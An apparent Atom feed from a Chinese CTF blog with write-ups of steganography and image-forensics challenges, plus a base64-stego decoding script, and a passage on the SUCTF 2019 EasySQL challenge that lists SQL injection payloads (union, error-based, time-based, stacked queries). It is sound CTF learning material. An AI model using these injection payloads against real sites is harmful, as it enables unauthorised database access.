<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Αιώνιος</title>
  
  <subtitle>The value of life lies not length of days, but in the use of we make of them.</subtitle>
  <link href="http://daweitech.github.io/atom.xml" rel="self"/>
  
  <link href="http://daweitech.github.io/"/>
  <updated>2021-10-14T03:09:48.939Z</updated>
  <id>http://daweitech.github.io/</id>
  
  <author>
    <name>4v1d</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>0</title>
    <link href="http://daweitech.github.io/2021/10/14/misc/0/"/>
    <id>http://daweitech.github.io/2021/10/14/misc/0/</id>
    <published>2021-10-14T02:18:33.000Z</published>
    <updated>2021-10-14T03:09:48.939Z</updated>
    
    <content type="html"><![CDATA[<h3 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h3><p>下载附件用010editor打开图片</p><p><img src="/2021/10/14/misc/0/image-20211014102322578.png" alt="image-20211014102322578"></p><p>左下角出现CRC错误提示，怀疑图片宽高被修改了</p><p>我们只需要把图片的宽高修改到一样即可</p><p><img src="/2021/10/14/misc/0/image-20211014102527640.png" alt="image-20211014102527640"></p><p>保存后重新打开</p><p><img src="/2021/10/14/misc/0/image-20211014102607570.png" alt="image-20211014102607570"></p><h3 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h3><p>简单的zip密码爆破</p><p><img src="/2021/10/14/misc/0/image-20211014102826717.png" alt="image-20211014102826717"></p><p>得到密文：ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=</p><p>base64解密一下就好</p><h3 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h3><p>打开后将图像另存为，然后010打开</p><p><img src="/2021/10/14/misc/0/image-20211014103429846.png" alt="image-20211014103429846"></p><p><img src="/2021/10/14/misc/0/image-20211014103446744.png" alt="image-20211014103446744"></p><h3 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h3><p><img src="/2021/10/14/misc/0/image-20211014110141284.png" alt="image-20211014110141284"></p><p>steg走一波</p><p>是LSB隐写</p><p><img src="/2021/10/14/misc/0/image-20211014110238268.png" alt="image-20211014110238268"></p><h3 id="ACTF新生赛2020-base64隐写"><a href="#ACTF新生赛2020-base64隐写" class="headerlink" title="[ACTF新生赛2020]base64隐写"></a>[ACTF新生赛2020]base64隐写</h3><p>这题重要的还是脚本</p><p>打开zip</p><p><img src="/2021/10/14/misc/0/image-20211014110553017.png" alt="image-20211014110553017"></p><p><img src="/2021/10/14/misc/0/image-20211014110605846.png" alt="image-20211014110605846"></p><p>抄了大佬脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span>(<span class="params">s1, s2</span>):</span></span><br><span class="line">    base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span>():</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;ComeOn!.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="keyword">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">&#x27;0&#x27;</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="keyword">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span>(<span class="params">bin_str</span>):</span></span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator\Downloads\tmp\近在眼前&gt; python2 .\test.py</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">5</span><br><span class="line">A</span><br><span class="line">0</span><br><span class="line">A</span><br><span class="line">13</span><br><span class="line">AC</span><br><span class="line">1</span><br><span class="line">AC</span><br><span class="line">1</span><br><span class="line">AC</span><br><span class="line">0</span><br><span class="line">ACT</span><br><span class="line">4</span><br><span class="line">ACT</span><br><span class="line">1</span><br><span class="line">ACT</span><br><span class="line">2</span><br><span class="line">ACTF</span><br><span class="line">1</span><br><span class="line">ACTF</span><br><span class="line">3</span><br><span class="line">ACTF</span><br><span class="line">11</span><br><span class="line">ACTF&#123;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;</span><br><span class="line">13</span><br><span class="line">ACTF&#123;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;</span><br><span class="line">2</span><br><span class="line">ACTF&#123;6</span><br><span class="line">1</span><br><span class="line">ACTF&#123;6</span><br><span class="line">8</span><br><span class="line">ACTF&#123;6</span><br><span class="line">1</span><br><span class="line">ACTF&#123;6a</span><br><span class="line">7</span><br><span class="line">ACTF&#123;6a</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6a</span><br><span class="line">13</span><br><span class="line">ACTF&#123;6as</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6as</span><br><span class="line">2</span><br><span class="line">ACTF&#123;6as</span><br><span class="line">1</span><br><span class="line">ACTF&#123;6as</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6as</span><br><span class="line">1</span><br><span class="line">ACTF&#123;6ase</span><br><span class="line">1</span><br><span class="line">ACTF&#123;6ase</span><br><span class="line">2</span><br><span class="line">ACTF&#123;6ase</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6ase</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6ase</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6ase</span><br><span class="line">2</span><br><span class="line">ACTF&#123;6aseb</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb</span><br><span class="line">3</span><br><span class="line">ACTF&#123;6aseb</span><br><span class="line">1</span><br><span class="line">ACTF&#123;6aseb</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4</span><br><span class="line">1</span><br><span class="line">ACTF&#123;6aseb4</span><br><span class="line">1</span><br><span class="line">ACTF&#123;6aseb4</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4</span><br><span class="line">3</span><br><span class="line">ACTF&#123;6aseb4</span><br><span class="line">3</span><br><span class="line">ACTF&#123;6aseb4_</span><br><span class="line">1</span><br><span class="line">ACTF&#123;6aseb4_</span><br><span class="line">2</span><br><span class="line">ACTF&#123;6aseb4_</span><br><span class="line">6</span><br><span class="line">ACTF&#123;6aseb4_f</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f</span><br><span class="line">3</span><br><span class="line">ACTF&#123;6aseb4_f</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f</span><br><span class="line">3</span><br><span class="line">ACTF&#123;6aseb4_f3</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f3</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f3</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f3</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f3</span><br><span class="line">3</span><br><span class="line">ACTF&#123;6aseb4_f3</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f3</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f3</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f3</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f3</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f3</span><br><span class="line">12</span><br><span class="line">ACTF&#123;6aseb4_f33</span><br><span class="line">2</span><br><span class="line">ACTF&#123;6aseb4_f33</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33</span><br><span class="line">1</span><br><span class="line">ACTF&#123;6aseb4_f33!</span><br><span class="line">7</span><br><span class="line">ACTF&#123;6aseb4_f33!</span><br><span class="line">13</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">0</span><br><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br><span class="line">PS C:\Users\Administrator\Downloads\tmp\近在眼前&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;大白&quot;&gt;&lt;a href=&quot;#大白&quot; class=&quot;headerlink&quot; title=&quot;大白&quot;&gt;&lt;/a&gt;大白&lt;/h3&gt;&lt;p&gt;下载附件用010editor打开图片&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/10/14/misc/0/image-202110141</summary>
      
    
    
    
    
    <category term="misc" scheme="http://daweitech.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>suctf 2019 EasySQL</title>
    <link href="http://daweitech.github.io/2021/10/10/nss/0/"/>
    <id>http://daweitech.github.io/2021/10/10/nss/0/</id>
    <published>2021-10-10T11:36:24.000Z</published>
    <updated>2021-10-10T11:54:21.481Z</updated>
    
    <content type="html"><![CDATA[<p> 参考链接：</p><p>[<a href="https://www.cnblogs.com/peri0d/p/11598597.html">SUCTF 2019]EasySQL - peri0d - 博客园 (cnblogs.com)</a></p><p>[(4条消息) <a href="https://blog.csdn.net/m0_55771794/article/details/118709290">SUCTF 2019]EasySQL_m0_55771794的博客-CSDN博客</a></p><p>打开页面</p><p><img src="/2021/10/10/nss/0/image-20211010193758035.png" alt="image-20211010193758035"></p><p>先试试基本的注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or &#39;1&#39;&#x3D;&#39;1&#39;##or语句</span><br><span class="line">1&#39; order by 3##order语句</span><br><span class="line">1&#39; union select 1,2,3##联合查询</span><br><span class="line">1&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))#报错注入</span><br><span class="line">1&#39; and if(length(database())&gt;1,sleep(5),1)--+#时间注入</span><br></pre></td></tr></table></figure><p>结果都是下图</p><p><img src="/2021/10/10/nss/0/image-20211010194231781.png" alt="image-20211010194231781"></p><p>试到堆叠注入时成功了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show databases#</span><br></pre></td></tr></table></figure><p><img src="/2021/10/10/nss/0/image-20211010194353961.png" alt="image-20211010194353961"></p><p>继续</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show tables#</span><br></pre></td></tr></table></figure><p><img src="/2021/10/10/nss/0/image-20211010194430322.png" alt="image-20211010194430322"></p><p>就在我以为完事大吉的时候</p><p>现实给我当头一棒</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show columns from &#39;Flag&#39;#</span><br></pre></td></tr></table></figure><p><img src="/2021/10/10/nss/0/image-20211010194709636.png" 